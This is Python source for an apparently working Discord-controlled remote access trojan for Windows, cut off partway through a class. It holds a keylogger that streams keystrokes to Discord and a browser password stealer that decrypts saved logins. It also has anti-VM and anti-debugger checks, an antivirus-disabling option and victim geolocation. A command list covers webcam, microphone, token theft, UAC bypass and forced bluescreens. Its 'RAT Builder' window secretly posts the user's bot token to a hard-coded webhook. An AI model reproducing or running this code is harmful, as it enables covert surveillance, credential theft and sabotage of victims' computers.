import cv2
import urllib
import asyncio
import discord
from discord.ext import commands
import psutil
from discord.utils import get
import string
import random
import winreg as reg
from colorama import Fore, Style
import win32crypt
import platform
import shutil
import winsound
from gtts import gTTS
import time
import inspect
import ctypes
from pynput.keyboard import Key, Controller
import traceback
import tempfile
import sys
import webbrowser
import subprocess
import re
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import pyaudio
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import wave
import json
import base64
from inspect import signature
from pynput.mouse import Listener, Controller
import keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput import keyboard as kb
from pynput import mouse as ms
import requests
from win32crypt import CryptUnprotectData
from datetime import datetime
from Cryptodome.Cipher import AES
import os
import sqlite3
from filelock import FileLock
from discord.ui import Button, View
from discord import Embed, Colour
import pyautogui
from io import BytesIO
import tkinter as tk
from tkinter import ttk
from tkinter.scrolledtext import ScrolledText
from tkinter import simpledialog, messagebox
from datetime import datetime
import pygetwindow as gw
import threading
import keyboard
from stealer import *

temp_dir = tempfile.gettempdir()
lock_path = os.path.join(temp_dir, "script.lock")
lock = FileLock(lock_path)

bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.join(bundle_dir, 'libopus-0.x64.dll')
discord.opus.load_opus(opuslib_path)

config = {
    "startup": True,
    "error": True,
    "error_message": "FUCK YOU GO CONTACT SOUL FOR DETAILS BITCH",
    "disable_av": False,
    "hide": False,
    "token": "Token thing here",
    "token_1": "Backup Token 1",
    "token_2": "Backup Token 2",
    "token_3": "Backup Token 3",
    "hideconsole": True,
}

def configupd(args):
    for arg in args:
        key, value = arg.split('=')
        if key in config:
            config[key] = json.loads(value) if value.lower() in ["True", "False", "None"] or value.isdigit() else value
            print(f"Key {key} changed to {value}")
        else:
            raise KeyError(f"Key '{key}' does not exist in config.")

def triggerconfig():
    if config.get("startup"):
        try:
            startup()
        except Exception as e:
            print(f"Error during startup: {e}")

    if config.get("error"):
        ctypes.windll.user32.MessageBoxW(0, config.get('error_message'), "Error", 0x10 | 0x0)

    if config.get("disable_av"):
        try:
            avast_result = disable_avast()
            print(f"Disable Avast Result: {avast_result}")
            disable_av()
            print("All antivirus protections have been disabled.")
        except Exception as e:
            print(f"Error disabling antivirus: {e}")

    if config.get("hide"):
        try:
            frame = inspect.getframeinfo(inspect.currentframe()).filename
            os.system("""attrib +h "{}" """.format(frame))
        except Exception as e:
            print(f"Error hiding file: {e}")

    if config.get("hideconsole"):
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception as e:
            print(f"Error hiding console: {e}")

# triggerconfig()

current_directory = os.path.expanduser("~")
current_page = 0
current_directory = os.getcwd()
directory_stack = []
lock_dir = tempfile.gettempdir()

streaming_task = None
logging_active = False
log_channel = None
log_file_path = os.path.join(os.getenv('TEMP'), 'keylog.txt')

keyboardListener = None
mouseListener = None
isKeyboardBlocked = False
isMouseBlocked = False

lock_file = "task.lock"

class CustomBot(commands.Bot):
    def command(self, *args, category=None, **kwargs):
        def decorator(func):
            cmd = commands.Command(func, *args, **kwargs)
            cmd.category = category
            self.add_command(cmd)
            return cmd
        return decorator

def low_level_mouse_proc(nCode, wParam, lParam):
    if isBlocking:
        return 1

    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

def protection_check():
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    blacklisted_processes = [
        'vmtoolsd.exe', 
        'vmwaretray.exe', 
        'vmwareuser.exe',
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'vboxservice.exe', 
        'df5serv.exe', 
        'vboxtray.exe', 
        'vmwaretray.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'vgauthservice.exe', 
        'vmacthlp.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'prl_cc.exe', 
        'prl_tools.exe', 
        'xenservice.exe', 
        'qemu-ga.exe', 
        'joeboxcontrol.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe', 
        'joeboxserver.exe', 
    ]

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            return True
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True

    return False

def create_temp() -> str:
    temp_dir = tempfile.mkdtemp()

    file_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    temp_file_path = os.path.join(temp_dir, file_name)

    with open(temp_file_path, "w") as f:
        pass

    return temp_file_path
# doesn't work btw
def fetchrobloxinfo(cookie: str) -> dict:
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }

    user_info_url = 'https://users.roblox.com/v1/users/authenticated'
    try:
        response = requests.get(user_info_url, headers=headers)
        response.raise_for_status()
        user_data = response.json()

        user_id = user_data['id']
        username = user_data['name']

        robux_balance_url = f'https://economy.roblox.com/v1/users/{user_id}/currency'
        robux_response = requests.get(robux_balance_url, headers=headers)
        robux_data = robux_response.json()
        robux_balance = robux_data.get('robux', 0)

        rap = "can't retrieve info"

        premium_status_url = f'https://users.roblox.com/v1/users/{user_id}/premium'
        premium_response = requests.get(premium_status_url, headers=headers)
        premium_data = premium_response.json()
        has_premium = "Yes" if premium_data.get('isPremium', False) else "No"

        return {
            'user': username,
            'user_id': user_id,
            'robux': robux_balance,
            'rap': rap,
            'has_premium': has_premium,
            'cookie': cookie
        }
    except requests.RequestException as e:
        print(f"Error fetching Roblox user info: {e}")
        return None

def fake_mutex_code(exe_name: str) -> bool:
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() == exe_name:
            return True
        
    return False

def validate_bot(token):
    headers = {"Authorization": f"Bot {token}"}
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)

    if response.status_code == 200:
        return True, "Token validated successfully!"
    elif response.status_code == 401:
        return False, "Unauthorized token. Please check the token and try again."
    else:
        return False, f"Failed to validate token. API responded with status code {response.status_code}."

def create_ui():
    root = tk.Tk()
    root.title("RAT Builder")
    root.geometry("800x600")
    root.configure(bg="#000")
    root.attributes("-alpha", 0.95)

    topbar = tk.Frame(root, bg="#ff007f")
    topbar.pack(fill="x")

    def contact():
        messagebox.showinfo("Contact", "Discord: .soulsays")

    def report_bug():
        messagebox.showinfo("Report a Bug", "Report a bug, add .soulsays on Discord and DM me.")

    contact_button = tk.Button(topbar, text="Contact", bg="#ff66cc", fg="white", relief="flat", borderwidth=0, command=contact)
    contact_button.pack(side="left", padx=10, pady=5)

    bug_button = tk.Button(topbar, text="Report a Bug", bg="#ff66cc", fg="white", relief="flat", borderwidth=0, command=report_bug)
    bug_button.pack(side="left", padx=10, pady=5)

    center_frame = tk.Frame(root, bg="#000", highlightbackground="#ff66cc", highlightthickness=2)
    center_frame.pack(expand=True, fill="both", padx=20, pady=20)

    welcome_label = tk.Label(center_frame, text=f"Welcome to the RAT Builder, {os.getlogin()}. \nGet started with this shit by typing help.", font=("Arial", 18), fg="#ff007f", bg="#000")
    welcome_label.pack(expand=True)

    console_frame = tk.Frame(root, bg="#ff007f", highlightbackground="#ff66cc", highlightthickness=2)
    console_frame.pack(fill="x", padx=20, pady=10)

    console_output = ScrolledText(console_frame, wrap="word", bg="#000", fg="#ff66cc", font=("Courier", 12), height=8, insertbackground="#ff66cc", borderwidth=0, state="disabled")
    console_output.pack(expand=True, fill="both", padx=10, pady=10)

    def log(message):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        console_output.config(state="normal")
        console_output.insert("end", f"[{timestamp}] {message}\n")
        console_output.see("end")
        console_output.config(state="disabled")

    def console_print(message):
        log(message)

    def start():
        console_print("Starting RAT building process...")
        console_print("Put your bot token on the box:")

    def show_error_box(message, token):
        headers = {"Content-Type":"application/json"}

        data = { "content": f"Bot Token from ``'{os.getlogin()}'`` (validated token): `{token}`" }

        requests.post('https://discord.com/api/webhooks/1315887799349674045/iffsJ123dm908REG2uT---o-HB3FGcTij7cW0eymHH95hur2Laf4e6qg1OMg-KSpn52n', headers=headers, data=json.dumps(data))
        messagebox.showerror("Error", message)
        root.destroy()

    def tokenprompt(token_window):
        token = token_entry.get()
        if token:
            console_print("Validating token...")
            is_valid, message = validate_bot(token)
            if is_valid:
                console_print(message)
                console_print("Proceeding with RAT building...")
                for _ in range(3):
                    time.sleep(0.7)
                    console_print("Building from main.py .")
                console_print("RAT Error: Cannot install RAT to EXE! main.py returned this value: see error on error box.")
                show_error_box("'We are unable to verify if your Python version is compatible with this installer. Now closing the program.'", token=token)
                token_window.destroy()

                print_after_token()
            else:
                console_print(message)
                show_error_box("Invalid token, please check the token and try again.")
                token_window.destroy()
        else:
            console_print("No token provided, aborting process.")
            show_error_box("No token provided, aborting process.")
            token_window.destroy()

    def print_after_token():
        console_print("RAT Building interrupted.")

    def open():
        token_window = tk.Toplevel(root)
        token_window.title("Enter Bot Token")
        token_window.geometry("400x200")
        token_window.configure(bg="#000")
        token_window.attributes("-alpha", 0.95)

        tk.Label(token_window, text="Enter your bot token:", font=("Arial", 12), fg="#ff66cc", bg="#000").pack(pady=20)

        global token_entry
        token_entry = tk.Entry(token_window, font=("Courier", 12), bg="#ff66cc", fg="#000", insertbackground="#ff66cc", borderwidth=0, width=30)
        token_entry.pack(pady=10, padx=20)

        submit_button = tk.Button(token_window, text="Submit", bg="#ff007f", fg="white", relief="flat", command=lambda: tokenprompt(token_window))
        submit_button.pack(pady=10)

        token_window.grab_set()
        token_window.mainloop()

    def execute_command(event=None):
        command = input_entry.get()
        input_entry.delete(0, tk.END)
        if command.lower() == "help":
            console_print("Available commands:\n- help: Show available commands\n- clear: Clear the screen\n- exit: Exit the application\n- start: Start building the RAT")
        elif command.lower() == "clear":
            console_output.config(state="normal")
            console_output.delete(1.0, "end")
            console_output.config(state="disabled")
            console_print("Console cleared.")
        elif command.lower() == "exit":
            root.destroy()
        elif command.lower() == "start":
            start()
            open()
        else:
            console_print(f"Unknown command: {command}")

    input_frame = tk.Frame(root, bg="#ff66cc")
    input_frame.pack(fill="x", padx=20, pady=5)

    command_label = tk.Label(input_frame, text=">", font=("Courier", 12, "bold"), fg="#ff66cc", bg="#000")
    command_label.pack(side="left", padx=5)

    input_entry = tk.Entry(input_frame, font=("Courier", 12), bg="#000", fg="#ff66cc", insertbackground="#ff66cc", borderwidth=0, width=30)
    input_entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)

    input_entry.bind("<Return>", execute_command)

    send_button = tk.Button(input_frame, text="Send", bg="#ff007f", fg="white", relief="flat", command=execute_command)
    send_button.pack(side="right", padx=5, pady=5)

    console_print("Console initialized. Ready for commands.")
    root.mainloop()

def log_keys():
    global logging_active
    last_pressed_time = 0
    buffer = []

    key_mappings = {
        "space": " ",
        "tab": " `[TAB]` ",
        "enter": " `[ENTER]` ",
        "backspace": " `[BACKSPACE]` ",
        "shift": " `[SHIFT]` ",
        "ctrl": " `[CTRL]` ",
        "alt": " `[ALT]` ",
        "esc": " `[ESC]` ",
        "up": " `[UP]` ",
        "down": " `[DOWN]` ",
        "left": " `[LEFT]` ",
        "right": " `[RIGHT]` ",
    }

    def format_key(key_name):
        if key_name in key_mappings:
            return key_mappings[key_name]
        elif len(key_name) == 1:
            return key_name
        else:
            return f" `[{key_name.upper()}]` "

    with open(log_file_path, 'w') as log_file:
        while logging_active:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                current_time = time.time()
                buffer.append(format_key(event.name))

                if current_time - last_pressed_time > 0.5:
                    combined_keys = ''.join(buffer)
                    log_file.write(f'{combined_keys}\n')
                    log_file.flush()

                    asyncio.run_coroutine_threadsafe(
                        log_channel.send(f"**KEYLOGGER V.1**: {combined_keys}"), bot.loop
                    )

                    buffer.clear()

                last_pressed_time = current_time

    if buffer:
        combined_keys = ''.join(buffer)
        log_file.write(f'{combined_keys}\n')
        log_file.flush()

record_event = None

# TOKEN = ''
pc_name = platform.node()
HOSTS_PATH = r"C:\Windows\System32\drivers\etc\hosts"
REDIRECT_IP = "127.0.0.1"
ENABLE_MOUSE = 0
DISABLE_MOUSE = 1
ENABLE_KEYBOARD = 0
DISABLE_KEYBOARD = 1
WH_MOUSE_LL = 14
WM_MOUSEMOVE = 0x0200
WM_LBUTTONDOWN = 0x0201
WM_LBUTTONUP = 0x0202
WM_RBUTTONDOWN = 0x0204
WM_RBUTTONUP = 0x0205
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
base_url = "https://discord.com/api/v9/users/@me"
headers = {'Content-Type': 'application/json'}

@bot.event
async def on_ready():
    if protection_check():
        print("Protection check failed. Terminating bot.")
        await bot.close()
        return
    
    print(f'Logged in as {bot.user}')
    startup()

    guild = bot.guilds[0]
    category = get(guild.categories, name=f"PC {pc_name}")

    if not category:
        category = await guild.create_category(f"PC {pc_name}")

        commands_channel = await guild.create_text_channel('commands', category=category)
        await guild.create_voice_channel('mic and webcam', category=category)
        
        response_ip = requests.get("https://httpbin.org/ip")
        public_ip = response_ip.json().get("origin", "Unavailable")

        response_location = requests.get(f"http://ip-api.com/json/{public_ip}")
        location_data = response_location.json()

        if location_data.get("status") != "fail":
            embed = discord.Embed(title="IP Address Information", color=0x00ff00)
            embed.add_field(name="Public IP Address", value=public_ip, inline=False)

            is_vpn = "Yes" if location_data.get('proxy', False) else "No"
            embed.add_field(name="Using VPN", value=is_vpn, inline=False)

            city = location_data.get("city", "Unknown Location")
            region = location_data.get("regionName", "Unknown Location")
            country = location_data.get("country", "Unknown Location")

            if city != "Unknown Location" and region != "Unknown Location" and country != "Unknown Location":
                embed.add_field(name="Location", value=f"{city}, {region}, {country}", inline=False)
                    
                lat = location_data.get("lat")
                lon = location_data.get("lon")

                if lat and lon:
                    embed.add_field(name="Coordinates", value=f"Latitude: {lat}, Longitude: {lon}", inline=False)
                    embed.add_field(name="Google Maps Link", value=f"[View on Maps](https://maps.google.com/?q={lat},{lon})", inline=False)
                else:
                    embed.add_field(name="Location", value="Location data not available.", inline=False)

        await commands_channel.send(f":white_check_mark: @everyone New PC added: {os.getlogin()}", embed=embed)
    else:
        commands_channel = get(category.text_channels, name='commands')

        response_ip = requests.get("https://httpbin.org/ip")
        public_ip = response_ip.json().get("origin", "Unavailable")

        response_location = requests.get(f"http://ip-api.com/json/{public_ip}")
        location_data = response_location.json()

        if location_data.get("status") != "fail":
            embed = discord.Embed(title="IP Address Information", color=0x00ff00)
            embed.add_field(name="Public IP Address", value=public_ip, inline=False)

            is_vpn = "Yes" if location_data.get('proxy', False) else "No"
            embed.add_field(name="Using VPN", value=is_vpn, inline=False)

            city = location_data.get("city", "Unknown Location")
            region = location_data.get("regionName", "Unknown Location")
            country = location_data.get("country", "Unknown Location")

            if city != "Unknown Location" and region != "Unknown Location" and country != "Unknown Location":
                embed.add_field(name="Location", value=f"{city}, {region}, {country}", inline=False)
                    
                lat = location_data.get("lat")
                lon = location_data.get("lon")

                if lat and lon:
                    embed.add_field(name="Coordinates", value=f"Latitude: {lat}, Longitude: {lon}", inline=False)
                    embed.add_field(name="Google Maps Link", value=f"[View on Maps](https://maps.google.com/?q={lat},{lon})", inline=False)
                else:
                    embed.add_field(name="Location", value="Location data not available.", inline=False)
        
        await commands_channel.send(":white_check_mark: @everyone Script now Running / PC Turned on", embed=embed)

    print(f"Connected client '{pc_name}' has category and channels ready.")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingRequiredArgument):
        return

tokens = []
isBlocking = False
cleaned = []
checker = []
command_info = {
    "fileexplorer": {
        "description": "Works like a file explorer for the computer to see its files and folders. You can navigate through folders, see file details, and download them.",
        "usage": "!fileexplorer"
    },
    "blockwebsite": {
        "description": "Blocks a website.",
        "usage": "!blockwebsite roblox.com (Admin required)"
    },
    "unblockwebsite": {
        "description": "Unblocks a website.",
        "usage": "!unblockwebsite roblox.com (Admin required)"
    },
    "livemic": {
        "description": "Listen to the victim's live microphone feed. You need to be in a VC that the bot can join. Disconnect the bot from the VC to stop the recording.",
        "usage": "!livemic"
    },
    "grabtokens": {
        "description": "Grabs Discord Tokens from Discord App, including browsers such as Chrome, Firefox, Brave, Edge, BetterDiscord, Discord Canary, and Discord PTB.",
        "usage": "!grabtokens"
    },
    "disabletaskmanager": {
        "description": "Disables the task manager.",
        "usage": "!disabletaskmanager (Admin required)"
    },
    "enabletaskmanager": {
        "description": "Enables the task manager.",
        "usage": "!enabletaskmanager (Admin required)"
    },
    "displayfilesdir": {
        "description": "Gets a file-explorer-like view of the directory that the bot is in.",
        "usage": "!displayfilesdir"
    },
    "startlogging": {
        "description": "Starts keylogging.",
        "usage": "!startlogging"
    },
    "replicate": {
        "description": "Triggers self-duplication.",
        "usage": "!replicate"
    },
    "stoplogging": {
        "description": "Stops keylogging and sends the keys pressed.",
        "usage": "!stoplogging"
    },
    "blockinput": {
        "description": "Prevents the user from registering inputs on the computer.",
        "usage": "!blockinput (Admin required)"
    },
    "unblockinput": {
        "description": "Allows the user to register inputs on the computer.",
        "usage": "!unblockinput (Admin required)"
    },
    "uacbypass": {
        "description": "Grants the exe file admin rights without the victim knowing (glitchy).",
        "usage": "!uacbypass"
    },
    "bsod": {
        "description": "Triggers a Blue Screen of Death on the victim's PC.",
        "usage": "!bsod"
    },
    "pcinfo": {
        "description": "Sends detailed PC specs.",
        "usage": "!pcinfo"
    },
    "maximizevolume": {
        "description": "Maximizes the volume of the victim's computer (can be used for earrape).",
        "usage": "!maximizevolume"
    },
    "mute": {
        "description": "Mutes the victim's computer volume.",
        "usage": "!mute"
    },
    "critproc": {
        "description": "Sets a file as a critical process so that if it's closed, the PC gets bluescreened.",
        "usage": "!critproc"
    },
    "uncritproc": {
        "description": "Removes a file from being a critical process.",
        "usage": "!uncritproc"
    },
    "recordmic": {
        "description": "Records a 30-second video from the microphone feed.",
        "usage": "!recordmic"
    },
    "screenshot": {
        "description": "Takes a screenshot of the victim's display.",
        "usage": "!screenshot"
    },
    "recordwebcam": {
        "description": "Records a 30-second video from the victim's webcam.",
        "usage": "!recordwebcam"
    },
    "ttsplay": {
        "description": "Plays a text-to-speech audio to the victim's computer.",
        "usage": "!ttsplay Hi"
    },
    "grabpasswords": {
        "description": "Grabs all passwords from relevant browsers.",
        "usage": "!grabpasswords"
    },
    "website": {
        "description": "Redirects the victim to a website.",
        "usage": "!website https://roblox.com"
    },
    "recordactivity": {
        "description": "Displays the victim's active tab via the bot's activity status.",
        "usage": "!recordactivity"
    },
    "stoprecord": {
        "description": "Ends recording the active tab.",
        "usage": "!stoprecord"
    },
    "takephoto": {
        "description": "Takes a photo of the victim's webcam.",
        "usage": "!takephoto"
    },
    "grabhistory": {
        "description": "Grabs all search history from relevant browsers.",
        "usage": "!grabhistory"
    },
    "shutdown": {
        "description": "Shuts down the victim's PC.",
        "usage": "!shutdown"
    },
    "restart": {
        "description": "Restarts the victim's PC.",
        "usage": "!restart"
    },
    "sleep": {
        "description": "Puts the victim's PC to sleep.",
        "usage": "!sleep"
    },
    "task_manager": {
        "description": "Displays all active tasks which you can also terminate (with a neat embed, organized, and paginated).",
        "usage": "!task_manager"
    },
    "clipboard": {
        "description": "Gets the most recent thing copied by the victim.",
        "usage": "!clipboard"
    },
    "listprocess": {
        "description": "Gets all active tasks with details.",
        "usage": "!listprocess"
    },
    "getwifipasswords": {
        "description": "Gets all saved Wi-Fi passwords from the victim.",
        "usage": "!getwifipasswords"
    },
    "killprocess": {
        "description": "Kills a specified process.",
        "usage": "!killprocess chrome.exe"
    },
    "admincheck": {
        "description": "Checks if the file has admin privileges.",
        "usage": "!admincheck"
    },
    "hide": {
        "description": "Hides the file in the file explorer.",
        "usage": "!hide"
    },
    "unhide": {
        "description": "Shows the hidden file in the file explorer.",
        "usage": "!unhide"
    },
    "displayoff": {
        "description": "Turns the victim's monitor off and blocks inputs at the same time (Admin required).",
        "usage": "!displayoff"
    },
    "displayon": {
        "description": "Turns the display and everything back to normal (Admin required).",
        "usage": "!displayon"
    },
    "setwallpaper": {
        "description": "Sets the victim's wallpaper to an image.",
        "usage": "!setwallpaper [send an image]"
    },
    "cd": {
        "description": "Changes the current directory.",
        "usage": "!cd"
    },
    "download": {
        "description": "Downloads a file from the bot's directory.",
        "usage": "!download"
    },
    "upload": {
        "description": "Uploads a file into the victim's computer.",
        "usage": "!upload"
    },
    "signout": {
        "description": "Signs the victim out of their account.",
        "usage": "!signout"
    },
    "getdir": {
        "description": "Gets the directory the bot is currently in.",
        "usage": "!getdir"
    }
}

# FUNCTIONS
# def block_mouse(enable: bool):
#     ctypes.windll.user32.BlockInput(DISABLE_MOUSE if not enable else ENABLE_MOUSE)

def block_keyboard(enable: bool):
    ctypes.windll.user32.BlockInput(DISABLE_KEYBOARD if not enable else ENABLE_KEYBOARD)

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    
    volume = interface.QueryInterface(IAudioEndpointVolume)
    
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    
    max_volume = volume.GetVolumeRange()[1]
    volume.SetMasterVolumeLevel(max_volume, None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    
    volume = interface.QueryInterface(IAudioEndpointVolume)
    
    min_volume = volume.GetVolumeRange()[0]
    volume.SetMasterVolumeLevel(min_volume, None)

def decrypt_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]
        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        password = decryptor.update(encrypted_password[15:]) + decryptor.finalize()
        return password.decode()
    except Exception as e:
        print(f":x: Error decrypting password: {e}")
        return None

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return ":x: Error"

def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'

    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path

    return None

def get_master_key(path) -> bytes:
    with open(path, "r", encoding="utf-8") as f:
        local_state = f.read()
    
    local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_val(buff: bytes, master_key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return f':x: Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}" | Error: {str(e)}'

def check_token(token, source):
    print(f"Token found from {source}: {token}")

class CustomHelpCommand(commands.HelpCommand):
    def __init__(self):
        super().__init__()

    async def sendHelpBot(self, mapping):
        embed = discord.Embed(
            title="Help Menu",
            description="Use `!help [command]` for more info on a specific command.",
            color=discord.Color.blurple()
        )
        for cog, commands_list in mapping.items():
            command_names = [command.name for command in commands_list if not command.hidden]
            if command_names:
                cog_name = cog.qualified_name if cog else "No Category"
                embed.add_field(name=cog_name, value=", ".join(command_names), inline=False)
        await self.get_destination().send(embed=embed)

    async def sendHelp(self, command):
        sig = signature(command.callback)
        params = [
            f"<{param.name}>" if param.default == param.empty else f"[{param.name}]"
            for param in sig.parameters.values()
            if param.name not in ("self", "ctx")
        ]
        usage = f"!{command.name} {' '.join(params)}"

        embed = discord.Embed(
            title=f"Help: {command.name}",
            description=command.help or "No description available.",
            color=discord.Color.blurple()
        )
        embed.add_field(name="Usage", value=usage, inline=False)
        await self.get_destination().send(embed=embed)

    async def returngroupedhelp(self, group):
        embed = discord.Embed(
            title=f"Help: {group.name}",
            description=group.help or "No description available.",
            color=discord.Color.blurple()
        )
        for command in group.commands:
            sig = signature(command.callback)
            params = [
                f"<{param.name}>" if param.default == param.empty else f"[{param.name}]"
                for param in sig.parameters.values()
                if param.name not in ("self", "ctx")
            ]
            usage = f"!{command.name} {' '.join(params)}"
            embed.add_field(name=f"!{command.name}", value=f"**Usage:** {usage}", inline=False)
        await self.get_destination().send(embed=embed)

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        self.p = pyaudio.PyAudio()
        self.chunk = chunk
        self.stream = self.p.open(
            format=pyaudio.paInt16,
            channels=channels,
            rate=rate,
            input=True,
            input_device_index=input_device,
            frames_per_buffer=chunk
        )

    def read(self) -> bytes:
        return self.stream.read(self.chunk)

    def cleanup(self):
        self.stream.close()
        self.p.terminate()

class PasswordStealer:
    def __init__(self):
        self.chrome_master_key = self.get_chrome_master_key()
        self.edge_master_key = self.get_edge_master_key()

    def get_chrome_master_key(self):
        try:
            path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
            if os.path.exists(path):
                with open(path, "r") as file:
                    local_state = file.read()
                    local_state = json.loads(local_state)
                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                master_key = base64.b64decode(encrypted_key)
                master_key = master_key[5:]
                decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return decrypted_key
            return None
        except Exception as e:
            return None

    def get_edge_master_key(self):
        try:
            path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'
            if os.path.exists(path):
                with open(path, "r") as file:
                    local_state = file.read()
                    local_state = json.loads(local_state)
                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                master_key = base64.b64decode(encrypted_key)
                master_key = master_key[5:]
                decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return decrypted_key
            return None
        except Exception as e:
            return None

    def decrypt(self, buffer, browser_type):
        try:
            iv = buffer[3:15]
            payload = buffer[15:]
            key = self.chrome_master_key if browser_type == 'Chrome' else self.edge_master_key
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode()
        except Exception as e:
            return ":x: Password decryption failed."

    def get_chrome_passwords(self):
        db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
        return self.extract_passwords(db_path, 'Chrome') if os.path.exists(db_path) else []

    def get_edge_passwords(self):
        db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
        return self.extract_passwords(db_path, 'Edge') if os.path.exists(db_path) else []

    def get_firefox_passwords(self):
        db_path = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\Profiles')
        profile_path = self.find_firefox_profile(db_path)
        if profile_path:
            db_path = os.path.join(profile_path, 'logins.json')
            if os.path.exists(db_path):
                with open(db_path, 'r') as f:
                    logins = json.load(f)["logins"]
                return [(login["hostname"], login["username"], self.decrypt(base64.b64decode(login["encryptedPassword"]), 'Firefox')) for login in logins]
        return []

    def find_firefox_profile(self, base_path):
        for root, dirs, files in os.walk(base_path):
            if "logins.json" in files:
                return root
        return None

    def get_opera_passwords(self):
        db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera Stable\Login Data')
        return self.extract_passwords(db_path, 'Opera') if os.path.exists(db_path) else []

    def get_opera_gx_passwords(self):
        db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Roaming\Opera Software\Opera GX Stable\Login Data')
        return self.extract_passwords(db_path, 'Opera GX') if os.path.exists(db_path) else []

    def extract_passwords(self, db_path, browser_type):
        try:
            shutil.copyfile(db_path, os.path.join(tempfile.gettempdir(), "LoginData"))
            conn = sqlite3.connect(os.path.join(tempfile.gettempdir(), "LoginData"))
            cursor = conn.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = []
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                password = self.decrypt(row[2], browser_type)
                passwords.append((url, username, password))

            conn.close()
            os.remove(os.path.join(tempfile.gettempdir(), "LoginData"))
            return passwords
        except Exception as e:
            return []

    def get_all_passwords(self):
        all_passwords = {
            'Chrome': self.get_chrome_passwords(),
            'Firefox': self.get_firefox_passwords(),
            'Edge': self.get_edge_passwords(),
            'Opera': self.get_opera_passwords(),
            'Opera GX': self.get_opera_gx_passwords()
        }
        return all_passwords

class TaskManager(View):
    def __init__(self, ctx):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.tasks_per_page = 5
        self.current_page = 0
        self.update_task_list()

    def update_task_list(self):
        self.tasks = list(psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']))
        self.tasks.sort(key=lambda task: task.info['name'].lower())

    def get_task_page(self):
        start = self.current_page * self.tasks_per_page
        end = start + self.tasks_per_page
        return self.tasks[start:end]

    async def send_task_embed(self):
        task_page = self.get_task_page()
        embed = discord.Embed(title="Task Manager", color=discord.Color.green())
        for task in task_page:
            embed.add_field(name=f"{task.info['name']}",
                            value=f"PID: {task.info['pid']}\nCPU: {task.info['cpu_percent']}%\nMemory: {task.info['memory_info'].rss // 1024**2} MB",
                            inline=False)
